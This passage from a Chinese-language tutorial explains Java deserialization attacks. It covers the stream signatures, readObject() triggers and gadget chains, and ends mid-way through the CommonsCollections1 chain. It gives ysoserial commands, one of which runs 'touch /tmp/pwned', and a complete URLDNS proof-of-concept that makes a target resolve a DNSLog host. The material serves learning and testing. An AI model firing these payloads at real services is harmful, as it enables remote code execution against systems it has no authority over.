+<p>序列化结果是一段二进制流，用十六进制查看时以 <code>AC ED 00 05</code> 开头——<code>AC ED</code> 是魔数（<code>STREAM_MAGIC</code>），<code>00 05</code> 是序列化协议版本（<code>STREAM_VERSION</code>）。在渗透测试和 CTF 中，只要看到：</p>
+<ul>
+<li>十六进制以 <code>AC ED 00 05</code> 开头的数据；</li>
+<li>Base64 解码前以 <code>rO0AB</code> 开头的字符串（<code>AC ED 00 05</code> 的 Base64 形态）；</li>
+</ul>
+<p>基本就可以断定这是一个 Java 原生序列化对象，是潜在的反序列化攻击面。</p>
+<h3 id="readobject">触发点：readObject()<a class="headerlink" href="#readobject" title="Permanent link">¶</a></h3>
+<p>关键点在于：<strong>如果目标类自己定义了 <code>readObject()</code> 方法，<code>ObjectInputStream.readObject()</code> 在还原对象时就会自动调用它</strong>，地位和 PHP 的 <code>__wakeup()</code> 相当：</p>
+<div class="highlight"><pre><span></span><code><a id="__codelineno-1-1" name="__codelineno-1-1" href="#__codelineno-1-1"></a><span class="kd">static</span><span class="w"> </span><span class="kd">class</span> <span class="nc">Evil</span><span class="w"> </span><span class="kd">implements</span><span class="w"> </span><span class="n">Serializable</span><span class="w"> </span><span class="p">{</span>
+<a id="__codelineno-1-2" name="__codelineno-1-2" href="#__codelineno-1-2"></a><span class="w">    </span><span class="kd">private</span><span class="w"> </span><span class="n">String</span><span class="w"> </span><span class="n">cmd</span><span class="p">;</span>
+<a id="__codelineno-1-3" name="__codelineno-1-3" href="#__codelineno-1-3"></a>
+<a id="__codelineno-1-4" name="__codelineno-1-4" href="#__codelineno-1-4"></a><span class="w">    </span><span class="c1">// 自定义 readObject，反序列化时自动回调</span>
+<a id="__codelineno-1-5" name="__codelineno-1-5" href="#__codelineno-1-5"></a><span class="w">    </span><span class="kd">private</span><span class="w"> </span><span class="kt">void</span><span class="w"> </span><span class="nf">readObject</span><span class="p">(</span><span class="n">ObjectInputStream</span><span class="w"> </span><span class="n">ois</span><span class="p">)</span><span class="w"> </span><span class="kd">throws</span><span class="w"> </span><span class="n">Exception</span><span class="w"> </span><span class="p">{</span>
+<a id="__codelineno-1-6" name="__codelineno-1-6" href="#__codelineno-1-6"></a><span class="w">        </span><span class="n">ois</span><span class="p">.</span><span class="na">defaultReadObject</span><span class="p">();</span><span class="w">          </span><span class="c1">// 先正常还原属性</span>
+<a id="__codelineno-1-7" name="__codelineno-1-7" href="#__codelineno-1-7"></a><span class="w">        </span><span class="n">Runtime</span><span class="p">.</span><span class="na">getRuntime</span><span class="p">().</span><span class="na">exec</span><span class="p">(</span><span class="n">cmd</span><span class="p">);</span><span class="w">   </span><span class="c1">// 然后……执行了 cmd</span>
+<a id="__codelineno-1-8" name="__codelineno-1-8" href="#__codelineno-1-8"></a><span class="w">    </span><span class="p">}</span>
+<a id="__codelineno-1-9" name="__codelineno-1-9" href="#__codelineno-1-9"></a><span class="p">}</span>
+</code></pre></div>
+<p>只要攻击者能控制传入 <code>readObject()</code> 的字节流，就能控制 <code>Evil.cmd</code> 的值，于是反序列化一个"用户数据"的动作就变成了命令执行。</p>
+<p>当然，现实中没人会把 <code>Runtime.exec</code> 明晃晃写在自己的 <code>readObject()</code> 里。真正的问题是：<strong>程序 classpath 里那些库中的类，它们的 <code>readObject()</code> 里做了什么？</strong> 顺着这些调用一路找下去，如果能找到一条从 <code>readObject()</code> 出发、途经若干"跳板"方法、最终到达 <code>Runtime.exec</code> 或类加载的路径，而且路径上每个对象的属性都能通过序列化数据控制——一条 gadget chain 就诞生了。</p>
+<h2 id="gadget-chain-ysoserial">Gadget Chain 与 ysoserial<a class="headerlink" href="#gadget-chain-ysoserial" title="Permanent link">¶</a></h2>
+<h3 id="gadget-chain">什么是 gadget chain<a class="headerlink" href="#gadget-chain" title="Permanent link">¶</a></h3>
+<ul>
+<li><strong>gadget</strong>：链上的一环，通常是某个类中的一个方法（<code>readObject()</code>、<code>hashCode()</code>、<code>transform()</code>……），它会利用自身属性去调用别的方法。</li>
+<li><strong>gadget chain</strong>：把若干个 gadget 通过"对象作为属性层层嵌套"串起来，使得一次 <code>readObject()</code> 调用像多米诺骨牌一样传导到最终的危险调用。</li>
+</ul>
+<p>这和 PHP POP 链的构造思路完全一致，区别只是 PHP 拼的是魔术方法，Java 拼的是 <code>readObject()</code> 加上各种普通方法。</p>
+<h3 id="ysoserial">ysoserial：开箱即用的链生成器<a class="headerlink" href="#ysoserial" title="Permanent link">¶</a></h3>
+<p>手工拼链费时费力，安全研究者把历史上公开的链做成了工具 <strong><a href="https://github.com/frohoff/ysoserial">ysoserial</a></strong>。它内置了 CommonsCollections、CommonsBeanutils、JRMPClient、URLDNS 等几十条链，一行命令生成 payload：</p>
+<div class="highlight"><pre><span></span><code><a id="__codelineno-2-1" name="__codelineno-2-1" href="#__codelineno-2-1"></a><span class="c1"># 需要 Java 环境；从 GitHub Releases 下载 ysoserial.jar</span>
+<a id="__codelineno-2-2" name="__codelineno-2-2" href="#__codelineno-2-2"></a>java<span class="w"> </span>-jar<span class="w"> </span>ysoserial.jar<span class="w"> </span>URLDNS<span class="w"> </span><span class="s2">"http://xxxx.dnslog.cn"</span><span class="w"> </span>&gt;<span class="w"> </span>urldns.ser
+<a id="__codelineno-2-3" name="__codelineno-2-3" href="#__codelineno-2-3"></a>
+<a id="__codelineno-2-4" name="__codelineno-2-4" href="#__codelineno-2-4"></a>java<span class="w"> </span>-jar<span class="w"> </span>ysoserial.jar<span class="w"> </span>CommonsCollections1<span class="w"> </span><span class="s2">"touch /tmp/pwned"</span><span class="w"> </span>&gt;<span class="w"> </span>cc1.ser
+</code></pre></div>
+<p>然后把生成的 <code>.ser</code> 文件（或其 Base64 形式）喂给目标的反序列化入口即可。</p>
+<p>使用 ysoserial 有一个必须理解的前提：<strong>payload 是否有效取决于目标环境的 classpath 里有没有对应的依赖及其版本</strong>。比如 <code>CommonsCollections1</code> 要求目标存在有漏洞版本的 commons-collections；目标没有的话，这条链在反序列化时连类都找不到，直接抛 <code>ClassNotFoundException</code>。所以实战中通常先用不依赖任何第三方库的 <strong>URLDNS 链</strong> 探测——它能触发一次 DNS 请求，只要 DNSLog 平台收到解析记录，就证明目标确实存在反序列化点且我们的 payload 被执行了。</p>
+<h2 id="urldns">手工推导 URLDNS 链<a class="headerlink" href="#urldns" title="Permanent link">¶</a></h2>
+<p>URLDNS 是 ysoserial 中最简单的一条链：只用 JDK 内置类，不依赖任何第三方库，效果是让目标发起一次 DNS 解析（不出网执行命令也能用 DNSLog 外带验证）。它非常适合用来体会"找链"的全过程。</p>
+<p>整条链只有三个类：<code>HashMap</code> → <code>URL</code> → <code>URLStreamHandler</code>。</p>
+<h3 id="hashmapreadobject">第一环：HashMap.readObject()<a class="headerlink" href="#hashmapreadobject" title="Permanent link">¶</a></h3>
+<p><code>java.util.HashMap</code> 自定义了 <code>readObject()</code>，还原键值对时会对每个 key 调用 <code>hash(key)</code>：</p>
+<div class="highlight"><pre><span></span><code><a id="__codelineno-3-1" name="__codelineno-3-1" href="#__codelineno-3-1"></a><span class="c1">// java.util.HashMap（JDK 源码，已简化）</span>
+<a id="__codelineno-3-2" name="__codelineno-3-2" href="#__codelineno-3-2"></a><span class="kd">private</span><span class="w"> </span><span class="kt">void</span><span class="w"> </span><span class="nf">readObject</span><span class="p">(</span><span class="n">ObjectInputStream</span><span class="w"> </span><span class="n">s</span><span class="p">)</span><span class="w"> </span><span class="p">{</span>
+<a id="__codelineno-3-3" name="__codelineno-3-3" href="#__codelineno-3-3"></a><span class="w">    </span><span class="n">s</span><span class="p">.</span><span class="na">defaultReadObject</span><span class="p">();</span>
+<a id="__codelineno-3-4" name="__codelineno-3-4" href="#__codelineno-3-4"></a><span class="w">    </span><span class="c1">// ... 省略容量计算 ...</span>
+<a id="__codelineno-3-5" name="__codelineno-3-5" href="#__codelineno-3-5"></a><span class="w">    </span><span class="k">for</span><span class="w"> </span><span class="p">(</span><span class="kt">int</span><span class="w"> </span><span class="n">i</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="mi">0</span><span class="p">;</span><span class="w"> </span><span class="n">i</span><span class="w"> </span><span class="o">&lt;</span><span class="w"> </span><span class="n">mappings</span><span class="p">;</span><span class="w"> </span><span class="n">i</span><span class="o">++</span><span class="p">)</span><span class="w"> </span><span class="p">{</span>
+<a id="__codelineno-3-6" name="__codelineno-3-6" href="#__codelineno-3-6"></a><span class="w">        </span><span class="n">K</span><span class="w"> </span><span class="n">key</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="p">(</span><span class="n">K</span><span class="p">)</span><span class="w"> </span><span class="n">s</span><span class="p">.</span><span class="na">readObject</span><span class="p">();</span>
+<a id="__codelineno-3-7" name="__codelineno-3-7" href="#__codelineno-3-7"></a><span class="w">        </span><span class="n">V</span><span class="w"> </span><span class="n">value</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="p">(</span><span class="n">V</span><span class="p">)</span><span class="w"> </span><span class="n">s</span><span class="p">.</span><span class="na">readObject</span><span class="p">();</span>
+<a id="__codelineno-3-8" name="__codelineno-3-8" href="#__codelineno-3-8"></a><span class="w">        </span><span class="n">putVal</span><span class="p">(</span><span class="n">hash</span><span class="p">(</span><span class="n">key</span><span class="p">),</span><span class="w"> </span><span class="n">key</span><span class="p">,</span><span class="w"> </span><span class="n">value</span><span class="p">,</span><span class="w"> </span><span class="kc">false</span><span class="p">,</span><span class="w"> </span><span class="kc">false</span><span class="p">);</span><span class="w">   </span><span class="c1">// ← 调用 hash(key)</span>
+<a id="__codelineno-3-9" name="__codelineno-3-9" href="#__codelineno-3-9"></a><span class="w">    </span><span class="p">}</span>
+<a id="__codelineno-3-10" name="__codelineno-3-10" href="#__codelineno-3-10"></a><span class="p">}</span>
+<a id="__codelineno-3-11" name="__codelineno-3-11" href="#__codelineno-3-11"></a>
+<a id="__codelineno-3-12" name="__codelineno-3-12" href="#__codelineno-3-12"></a><span class="kd">static</span><span class="w"> </span><span class="kd">final</span><span class="w"> </span><span class="kt">int</span><span class="w"> </span><span class="nf">hash</span><span class="p">(</span><span class="n">Object</span><span class="w"> </span><span class="n">key</span><span class="p">)</span><span class="w"> </span><span class="p">{</span>
+<a id="__codelineno-3-13" name="__codelineno-3-13" href="#__codelineno-3-13"></a><span class="w">    </span><span class="kt">int</span><span class="w"> </span><span class="n">h</span><span class="p">;</span>
+<a id="__codelineno-3-14" name="__codelineno-3-14" href="#__codelineno-3-14"></a><span class="w">    </span><span class="k">return</span><span class="w"> </span><span class="p">(</span><span class="n">key</span><span class="w"> </span><span class="o">==</span><span class="w"> </span><span class="kc">null</span><span class="p">)</span><span class="w"> </span><span class="o">?</span><span class="w"> </span><span class="mi">0</span><span class="w"> </span><span class="p">:</span><span class="w"> </span><span class="p">(</span><span class="n">h</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">key</span><span class="p">.</span><span class="na">hashCode</span><span class="p">())</span><span class="w"> </span><span class="o">^</span><span class="w"> </span><span class="p">(</span><span class="n">h</span><span class="w"> </span><span class="o">&gt;&gt;&gt;</span><span class="w"> </span><span class="mi">16</span><span class="p">);</span><span class="w">  </span><span class="c1">// ← 调用 key.hashCode()</span>
+<a id="__codelineno-3-15" name="__codelineno-3-15" href="#__codelineno-3-15"></a><span class="p">}</span>
+</code></pre></div>
+<p>也就是说：<strong>只要我们把一个对象放进 HashMap 当 key，反序列化时它的 <code>hashCode()</code> 就会被自动调用</strong>。这就是入口 gadget。</p>
+<h3 id="urlhashcode">第二环：URL.hashCode()<a class="headerlink" href="#urlhashcode" title="Permanent link">¶</a></h3>
+<p><code>java.net.URL</code> 重写了 <code>hashCode()</code>：</p>
+<div class="highlight"><pre><span></span><code><a id="__codelineno-4-1" name="__codelineno-4-1" href="#__codelineno-4-1"></a><span class="c1">// java.net.URL（JDK 源码，已简化）</span>
+<a id="__codelineno-4-2" name="__codelineno-4-2" href="#__codelineno-4-2"></a><span class="kd">public</span><span class="w"> </span><span class="kd">synchronized</span><span class="w"> </span><span class="kt">int</span><span class="w"> </span><span class="nf">hashCode</span><span class="p">()</span><span class="w"> </span><span class="p">{</span>
+<a id="__codelineno-4-3" name="__codelineno-4-3" href="#__codelineno-4-3"></a><span class="w">    </span><span class="k">if</span><span class="w"> </span><span class="p">(</span><span class="n">hashCode</span><span class="w"> </span><span class="o">!=</span><span class="w"> </span><span class="o">-</span><span class="mi">1</span><span class="p">)</span>
+<a id="__codelineno-4-4" name="__codelineno-4-4" href="#__codelineno-4-4"></a><span class="w">        </span><span class="k">return</span><span class="w"> </span><span class="n">hashCode</span><span class="p">;</span>
+<a id="__codelineno-4-5" name="__codelineno-4-5" href="#__codelineno-4-5"></a><span class="w">    </span><span class="n">hashCode</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">handler</span><span class="p">.</span><span class="na">hashCode</span><span class="p">(</span><span class="k">this</span><span class="p">);</span><span class="w">   </span><span class="c1">// handler 是 URLStreamHandler</span>
+<a id="__codelineno-4-6" name="__codelineno-4-6" href="#__codelineno-4-6"></a><span class="w">    </span><span class="k">return</span><span class="w"> </span><span class="n">hashCode</span><span class="p">;</span>
+<a id="__codelineno-4-7" name="__codelineno-4-7" href="#__codelineno-4-7"></a><span class="p">}</span>
+</code></pre></div>
+<h3 id="urlstreamhandlerhashcode">第三环：URLStreamHandler.hashCode() 触发解析<a class="headerlink" href="#urlstreamhandlerhashcode" title="Permanent link">¶</a></h3>
+<div class="highlight"><pre><span></span><code><a id="__codelineno-5-1" name="__codelineno-5-1" href="#__codelineno-5-1"></a><span class="c1">// java.net.URLStreamHandler（JDK 源码，已简化）</span>
+<a id="__codelineno-5-2" name="__codelineno-5-2" href="#__codelineno-5-2"></a><span class="kd">protected</span><span class="w"> </span><span class="kt">int</span><span class="w"> </span><span class="nf">hashCode</span><span class="p">(</span><span class="n">URL</span><span class="w"> </span><span class="n">u</span><span class="p">)</span><span class="w"> </span><span class="p">{</span>
+<a id="__codelineno-5-3" name="__codelineno-5-3" href="#__codelineno-5-3"></a><span class="w">    </span><span class="c1">// ... 拼接 protocol、host、file 等计算 hash ...</span>
+<a id="__codelineno-5-4" name="__codelineno-5-4" href="#__codelineno-5-4"></a><span class="w">    </span><span class="n">InetAddress</span><span class="w"> </span><span class="n">addr</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">getHostAddress</span><span class="p">(</span><span class="n">u</span><span class="p">);</span><span class="w">   </span><span class="c1">// ← 这里会对 host 做 DNS 解析！</span>
+<a id="__codelineno-5-5" name="__codelineno-5-5" href="#__codelineno-5-5"></a><span class="w">    </span><span class="c1">// ...</span>
+<a id="__codelineno-5-6" name="__codelineno-5-6" href="#__codelineno-5-6"></a><span class="p">}</span>
+</code></pre></div>
+<p><code>getHostAddress()</code> 内部调用 <code>InetAddress.getByName(host)</code>，也就是向 DNS 服务器发起一次对 <code>host</code> 的解析请求。如果 host 是 DNSLog 给的子域名，我们就能在平台上看到记录——目标执行了我们的 payload，实锤。</p>
+<h3 id="_2">串起来<a class="headerlink" href="#_2" title="Permanent link">¶</a></h3>
+<div class="highlight"><pre><span></span><code><a id="__codelineno-6-1" name="__codelineno-6-1" href="#__codelineno-6-1"></a>HashMap.readObject()
+<a id="__codelineno-6-2" name="__codelineno-6-2" href="#__codelineno-6-2"></a>    └── hash(key) → key.hashCode()
+<a id="__codelineno-6-3" name="__codelineno-6-3" href="#__codelineno-6-3"></a>            └── URL.hashCode()
+<a id="__codelineno-6-4" name="__codelineno-6-4" href="#__codelineno-6-4"></a>                    └── URLStreamHandler.hashCode(this)
+<a id="__codelineno-6-5" name="__codelineno-6-5" href="#__codelineno-6-5"></a>                            └── getHostAddress() → DNS 解析 → DNSLog 收到请求
+</code></pre></div>
+<h3 id="poc">一个小坑与完整 PoC<a class="headerlink" href="#poc" title="Permanent link">¶</a></h3>
+<p>直接 <code>map.put(url, 1)</code> 会出问题：<code>put</code> 时就会触发一次 <code>hashCode()</code>，DNS 请求在 <strong>本地生成 payload 时</strong> 就发出去了，而且 URL 的 <code>hashCode</code> 字段被缓存成 <code>-1</code> 以外的值，反序列化时反而不会再解析。解决办法是先随便放、再反射改回来：</p>
+<div class="highlight"><pre><span></span><code><a id="__codelineno-7-1" name="__codelineno-7-1" href="#__codelineno-7-1"></a><span class="kn">import</span><span class="w"> </span><span class="nn">java.io.*</span><span class="p">;</span>
+<a id="__codelineno-7-2" name="__codelineno-7-2" href="#__codelineno-7-2"></a><span class="kn">import</span><span class="w"> </span><span class="nn">java.lang.reflect.Field</span><span class="p">;</span>
+<a id="__codelineno-7-3" name="__codelineno-7-3" href="#__codelineno-7-3"></a><span class="kn">import</span><span class="w"> </span><span class="nn">java.net.URL</span><span class="p">;</span>
+<a id="__codelineno-7-4" name="__codelineno-7-4" href="#__codelineno-7-4"></a><span class="kn">import</span><span class="w"> </span><span class="nn">java.util.HashMap</span><span class="p">;</span>
+<a id="__codelineno-7-5" name="__codelineno-7-5" href="#__codelineno-7-5"></a>
+<a id="__codelineno-7-6" name="__codelineno-7-6" href="#__codelineno-7-6"></a><span class="kd">public</span><span class="w"> </span><span class="kd">class</span> <span class="nc">URLDNSPoC</span><span class="w"> </span><span class="p">{</span>
+<a id="__codelineno-7-7" name="__codelineno-7-7" href="#__codelineno-7-7"></a><span class="w">    </span><span class="kd">public</span><span class="w"> </span><span class="kd">static</span><span class="w"> </span><span class="kt">void</span><span class="w"> </span><span class="nf">main</span><span class="p">(</span><span class="n">String</span><span class="o">[]</span><span class="w"> </span><span class="n">args</span><span class="p">)</span><span class="w"> </span><span class="kd">throws</span><span class="w"> </span><span class="n">Exception</span><span class="w"> </span><span class="p">{</span>
+<a id="__codelineno-7-8" name="__codelineno-7-8" href="#__codelineno-7-8"></a><span class="w">        </span><span class="n">HashMap</span><span class="o">&lt;</span><span class="n">URL</span><span class="p">,</span><span class="w"> </span><span class="n">Integer</span><span class="o">&gt;</span><span class="w"> </span><span class="n">map</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="k">new</span><span class="w"> </span><span class="n">HashMap</span><span class="o">&lt;&gt;</span><span class="p">();</span>
+<a id="__codelineno-7-9" name="__codelineno-7-9" href="#__codelineno-7-9"></a><span class="w">        </span><span class="c1">// 先放一个无害的 URL，避免 put 时提前触发解析</span>
+<a id="__codelineno-7-10" name="__codelineno-7-10" href="#__codelineno-7-10"></a><span class="w">        </span><span class="n">URL</span><span class="w"> </span><span class="n">url</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="k">new</span><span class="w"> </span><span class="n">URL</span><span class="p">(</span><span class="s">"http://example.com"</span><span class="p">);</span>
+<a id="__codelineno-7-11" name="__codelineno-7-11" href="#__codelineno-7-11"></a><span class="w">        </span><span class="n">map</span><span class="p">.</span><span class="na">put</span><span class="p">(</span><span class="n">url</span><span class="p">,</span><span class="w"> </span><span class="mi">1</span><span class="p">);</span>
+<a id="__codelineno-7-12" name="__codelineno-7-12" href="#__codelineno-7-12"></a>
+<a id="__codelineno-7-13" name="__codelineno-7-13" href="#__codelineno-7-13"></a><span class="w">        </span><span class="c1">// 反射把 hashCode 改回 -1（未计算状态）</span>
+<a id="__codelineno-7-14" name="__codelineno-7-14" href="#__codelineno-7-14"></a><span class="w">        </span><span class="n">Field</span><span class="w"> </span><span class="n">f</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">URL</span><span class="p">.</span><span class="na">class</span><span class="p">.</span><span class="na">getDeclaredField</span><span class="p">(</span><span class="s">"hashCode"</span><span class="p">);</span>
+<a id="__codelineno-7-15" name="__codelineno-7-15" href="#__codelineno-7-15"></a><span class="w">        </span><span class="n">f</span><span class="p">.</span><span class="na">setAccessible</span><span class="p">(</span><span class="kc">true</span><span class="p">);</span>
+<a id="__codelineno-7-16" name="__codelineno-7-16" href="#__codelineno-7-16"></a><span class="w">        </span><span class="n">f</span><span class="p">.</span><span class="na">set</span><span class="p">(</span><span class="n">url</span><span class="p">,</span><span class="w"> </span><span class="o">-</span><span class="mi">1</span><span class="p">);</span>
+<a id="__codelineno-7-17" name="__codelineno-7-17" href="#__codelineno-7-17"></a>
+<a id="__codelineno-7-18" name="__codelineno-7-18" href="#__codelineno-7-18"></a><span class="w">        </span><span class="c1">// 反射把 host 改成 DNSLog 地址，让解析发生在目标端</span>
+<a id="__codelineno-7-19" name="__codelineno-7-19" href="#__codelineno-7-19"></a><span class="w">        </span><span class="n">Field</span><span class="w"> </span><span class="n">hostField</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">URL</span><span class="p">.</span><span class="na">class</span><span class="p">.</span><span class="na">getDeclaredField</span><span class="p">(</span><span class="s">"host"</span><span class="p">);</span>
+<a id="__codelineno-7-20" name="__codelineno-7-20" href="#__codelineno-7-20"></a><span class="w">        </span><span class="n">hostField</span><span class="p">.</span><span class="na">setAccessible</span><span class="p">(</span><span class="kc">true</span><span class="p">);</span>
+<a id="__codelineno-7-21" name="__codelineno-7-21" href="#__codelineno-7-21"></a><span class="w">        </span><span class="n">hostField</span><span class="p">.</span><span class="na">set</span><span class="p">(</span><span class="n">url</span><span class="p">,</span><span class="w"> </span><span class="s">"abcdef.dnslog.cn"</span><span class="p">);</span>
+<a id="__codelineno-7-22" name="__codelineno-7-22" href="#__codelineno-7-22"></a>
+<a id="__codelineno-7-23" name="__codelineno-7-23" href="#__codelineno-7-23"></a><span class="w">        </span><span class="c1">// 序列化</span>
+<a id="__codelineno-7-24" name="__codelineno-7-24" href="#__codelineno-7-24"></a><span class="w">        </span><span class="n">FileOutputStream</span><span class="w"> </span><span class="n">fos</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="k">new</span><span class="w"> </span><span class="n">FileOutputStream</span><span class="p">(</span><span class="s">"urldns.ser"</span><span class="p">);</span>
+<a id="__codelineno-7-25" name="__codelineno-7-25" href="#__codelineno-7-25"></a><span class="w">        </span><span class="n">ObjectOutputStream</span><span class="w"> </span><span class="n">oos</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="k">new</span><span class="w"> </span><span class="n">ObjectOutputStream</span><span class="p">(</span><span class="n">fos</span><span class="p">);</span>
+<a id="__codelineno-7-26" name="__codelineno-7-26" href="#__codelineno-7-26"></a><span class="w">        </span><span class="n">oos</span><span class="p">.</span><span class="na">writeObject</span><span class="p">(</span><span class="n">map</span><span class="p">);</span>
+<a id="__codelineno-7-27" name="__codelineno-7-27" href="#__codelineno-7-27"></a><span class="w">        </span><span class="n">oos</span><span class="p">.</span><span class="na">close</span><span class="p">();</span>
+<a id="__codelineno-7-28" name="__codelineno-7-28" href="#__codelineno-7-28"></a><span class="w">    </span><span class="p">}</span>
+<a id="__codelineno-7-29" name="__codelineno-7-29" href="#__codelineno-7-29"></a><span class="p">}</span>
+</code></pre></div>
+<p>把生成的 <code>urldns.ser</code> 丢给存在反序列化入口的目标，DNSLog 收到 <code>abcdef.dnslog.cn</code> 的解析记录，验证成功。实际测试中直接用 <code>java -jar ysoserial.jar URLDNS "http://abcdef.dnslog.cn"</code> 即可，手工推导是为了理解链的构造方法。</p>
+<h2 id="cc1-commonscollections1">CC1 链的思想（CommonsCollections1）<a class="headerlink" href="#cc1-commonscollections1" title="Permanent link">¶</a></h2>
+<p>URLDNS 只能发 DNS 请求，要真正 RCE 就需要能执行命令的链。最经典的是 CommonsCollections 系列。这里只讲思想，<strong>不要求背链</strong>——理解了思路，遇到 CC3/CC5/CC11 或 CB 链时对着资料也能看懂。</p>
+<p>CC1 依赖 Apache Commons-Collections 库（3.2.1 及以下版本）中的两个关键类：</p>
+<h3 id="invokertransformer">InvokerTransformer：任意方法调用器<a class="headerlink" href="#invokertransformer" title="Permanent link">¶</a></h3>
+<div class="highlight"><pre><span></span><code><a id="__codelineno-8-1" name="__codelineno-8-1" href="#__codelineno-8-1"></a><span class="c1">// org.apache.commons.collections.functors.InvokerTransformer（简化）</span>
+<a id="__codelineno-8-2" name="__codelineno-8-2" href="#__codelineno-8-2"></a><span class="kd">public</span><span class="w"> </span><span class="kd">class</span> <span class="nc">InvokerTransformer</span><span class="w"> </span><span class="kd">implements</span><span class="w"> </span><span class="n">Transformer</span><span class="w"> </span><span class="p">{</span>
+<a id="__codelineno-8-3" name="__codelineno-8-3" href="#__codelineno-8-3"></a><span class="w">    </span><span class="kd">private</span><span class="w"> </span><span class="kd">final</span><span class="w"> </span><span class="n">String</span><span class="w"> </span><span class="n">iMethodName</span><span class="p">;</span><span class="w">   </span><span class="c1">// 方法名，可控</span>
+<a id="__codelineno-8-4" name="__codelineno-8-4" href="#__codelineno-8-4"></a><span class="w">    </span><span class="kd">private</span><span class="w"> </span><span class="kd">final</span><span class="w"> </span><span class="n">Object</span><span class="o">[]</span><span class="w"> </span><span class="n">iArgs</span><span class="p">;</span><span class="w">       </span><span class="c1">// 参数，可控</span>
+<a id="__codelineno-8-5" name="__codelineno-8-5" href="#__codelineno-8-5"></a>
+<a id="__codelineno-8-6" name="__codelineno-8-6" href="#__codelineno-8-6"></a><span class="w">    </span><span class="kd">public</span><span class="w"> </span><span class="n">Object</span><span class="w"> </span><span class="nf">transform</span><span class="p">(</span><span class="n">Object</span><span class="w"> </span><span class="n">input</span><span class="p">)</span><span class="w"> </span><span class="p">{</span>
+<a id="__codelineno-8-7" name="__codelineno-8-7" href="#__codelineno-8-7"></a><span class="w">        </span><span class="n">Class</span><span class="w"> </span><span class="n">cls</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">input</span><span class="p">.</span><span class="na">getClass</span><span class="p">();</span>
+<a id="__codelineno-8-8" name="__codelineno-8-8" href="#__codelineno-8-8"></a><span class="w">        </span><span class="n">Method</span><span class="w"> </span><span class="n">method</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">cls</span><span class="p">.</span><span class="na">getMethod</span><span class="p">(</span><span class="n">iMethodName</span><span class="p">,</span><span class="w"> </span><span class="p">...);</span>
+<a id="__codelineno-8-9" name="__codelineno-8-9" href="#__codelineno-8-9"></a><span class="w">        </span><span class="k">return</span><span class="w"> </span><span class="n">method</span><span class="p">.</span><span class="na">invoke</span><span class="p">(</span><span class="n">input</span><span class="p">,</span><span class="w"> </span><span class="n">iArgs</span><span class="p">);</span><span class="w">   </span><span class="c1">// 反射调用 input 上的任意方法！</span>
+<a id="__codelineno-8-10" name="__codelineno-8-10" href="#__codelineno-8-10"></a><span class="w">    </span><span class="p">}</span>
+<a id="__codelineno-8-11" name="__codelineno-8-11" href="#__codelineno-8-11"></a><span class="p">}</span>
+</code></pre></div>
+<p><code>transform(input)</code> 等价于"对任意对象调用任意方法"。如果 <code>input</code> 是 <code>Runtime.getRuntime()</code> 的结果、方法名是 <code>exec</code>，就是命令执行。这就是链的"终点"。</p>
+<h3 id="transformedmapmap">TransformedMap：Map 包装器<a class="headerlink" href="#transformedmapmap" title="Permanent link">¶</a></h3>
+<div class="highlight"><pre><span></span><code><a id="__codelineno-9-1" name="__codelineno-9-1" href="#__codelineno-9-1"></a><span class="c1">// org.apache.commons.collections.map.TransformedMap（简化）</span>
+<a id="__codelineno-9-2" name="__codelineno-9-2" href="#__codelineno-9-2"></a><span class="kd">public</span><span class="w"> </span><span class="kd">class</span> <span class="nc">TransformedMap</span><span class="w"> </span><span class="kd">extends</span><span class="w"> </span><span class="n">AbstractInputCheckedMapDecorator</span><span class="w"> </span><span class="p">{</span>
+<a id="__codelineno-9-3" name="__codelineno-9-3" href="#__codelineno-9-3"></a><span class="w">    </span><span class="kd">protected</span><span class="w"> </span><span class="kd">final</span><span class="w"> </span><span class="n">Transformer</span><span class="w"> </span><span class="n">valueTransformer</span><span class="p">;</span>
+<a id="__codelineno-9-4" name="__codelineno-9-4" href="#__codelineno-9-4"></a>
+<a id="__codelineno-9-5" name="__codelineno-9-5" href="#__codelineno-9-5"></a><span class="w">    </span><span class="c1">// 向这个 Map 里放/改值时，value 会先经过 valueTransformer.transform()</span>
+<a id="__codelineno-9-6" name="__codelineno-9-6" href="#__codelineno-9-6"></a><span class="w">    </span><span class="kd">protected</span><span class="w"> </span><span class="n">Object</span><span class="w"> </span><span class="nf">checkSetValue</span><span class="p">(</span><span class="n">Object</span><span class="w"> </span><span class="n">value</span><span class="p">)</span><span class="w"> </span><span class="p">{</span>
+<a id="__codelineno-9-7" name="__codelineno-9-7" href="#__codelineno-9-7"></a><span class="w">        </span><span class="k">return</span><span class="w"> </span><span class="n">valueTransformer</span><span class="p">.</span><span class="na">transform</span><span class="p">(</span><span class="n">value</span><span class="p">);</span>
+<a id="__codelineno-9-8" name="__codelineno-9-8" href="#__codelineno-9-8"></a><span class="w">    </span><span class="p">}</span>
+<a id="__codelineno-9-9" name="__codelineno-9-9" href="#__codelineno-9-9"></a><span class="p">}</span>
+</code></pre></div>
+<p><code>TransformedMap.decorate()</code> 可以把一个普通 Map 包装成"改值时自动调用 transformer"的 Map。我们把 <code>valueTransformer</code> 设成恶意构造的 <code>InvokerTransformer</code>，那么只要反序列化过程中有人调用 <code>MapEntry.setValue()</code>，<code>transform()</code> 就会被触发，RCE 达成。</p>
+<h3 id="setvalue">谁来调用 setValue()<a class="headerlink" href="#setvalue" title="Permanent link">¶</a></h3>
+<p>链的最后一环需要一个"在 <code>readObject()</code> 里会遍历 Map 并调用 <code>setValue()</code>"的类——JDK 的 <code>sun.reflect.annotation.AnnotationInvocationHandler</code> 正好干这事：它的 <code>readObject()</code> 会遍历成员变量 Map 的 entry，并对不满足条件的 entry 调用 <code>setValue()</code>。</p>
+<p>于是整条链的思想就是：</p>
+<div class="highlight"><pre><span></span><code><a id="__codelineno-10-1" name="__codelineno-10-1" href="#__codelineno-10-1"></a>AnnotationInvocationHandler.readObject()
